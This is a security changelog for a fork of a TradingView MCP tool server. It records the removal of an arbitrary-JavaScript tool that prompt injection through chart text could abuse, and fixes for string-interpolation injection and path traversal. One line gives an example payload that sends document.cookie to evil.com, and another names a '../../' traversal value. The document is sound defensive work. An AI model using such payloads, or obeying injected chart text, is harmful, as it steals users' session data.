# Changelog

All notable changes to this fork (`rdmgator12/tradingview-mcp`) are documented here.

Upstream: [tradesdontlie/tradingview-mcp](https://github.com/tradesdontlie/tradingview-mcp)

## [1.0.1-security] - 2026-04-02

### Removed

- **`ui_evaluate` tool** — unrestricted arbitrary JavaScript execution via `Runtime.evaluate`. A prompt injection (e.g., via a malicious indicator name or chart description) could exfiltrate `document.cookie`, `localStorage`, or make authenticated requests to TradingView's backend. Removed from core (`src/core/ui.js`), MCP tool registration (`src/tools/ui.js`), and CLI (`src/cli/commands/ui.js`).

### Fixed

- **CDP string interpolation injection (24 points across 10 files)** — All user-supplied parameters (`symbol`, `entity_id`, `study_filter`, `date`, `price`, `timeframe`, `indicator`, `shape`, `layout`) were interpolated directly into JavaScript strings passed to `Runtime.evaluate` using the pattern `'${variable}'`. A crafted value like `'); fetch('https://evil.com/?c='+document.cookie);//` could break out of the string context and execute arbitrary code. All instances replaced with `JSON.stringify()` which properly escapes quotes, backslashes, and special characters.

  Files patched:
  - `src/core/data.js` — `filter`, `entity_id`, `symbol`
  - `src/core/drawing.js` — `shape`, `entity_id`
  - `src/core/replay.js` — `date`
  - `src/core/batch.js` — `symbol`, `tf`
  - `src/core/indicators.js` — `entity_id` (replaced incomplete single-quote escaping)
  - `src/core/chart.js` — `symbol`, `timeframe`, `indicator`, `entity_id` (replaced incomplete single-quote escaping)
  - `src/core/alerts.js` — `price`
  - `src/core/pane.js` — `symbol`, `layout` (replaced incomplete single-quote escaping)

- **Path traversal in screenshot filenames** — `capture_screenshot` and `batch_run` accepted `filename`/`symbol` parameters used in `path.join()` without sanitization. A value containing `../../` could write PNG files outside the `screenshots/` directory. Now strips `..`, `/`, and `\` from filenames before joining.

  Files patched:
  - `src/core/capture.js`
  - `src/core/batch.js`

### Not changed

- Supply chain (2 deps, both clean)
- CDP binding (hardcoded to `localhost:9222`)
- Authenticated page-context `fetch()` calls in `pine_list_scripts`, `pine_open`, `alert_list` — these use `credentials: 'include'` by design. Now that `ui_evaluate` is removed, these are scoped to their specific endpoints and not exploitable via arbitrary JS.
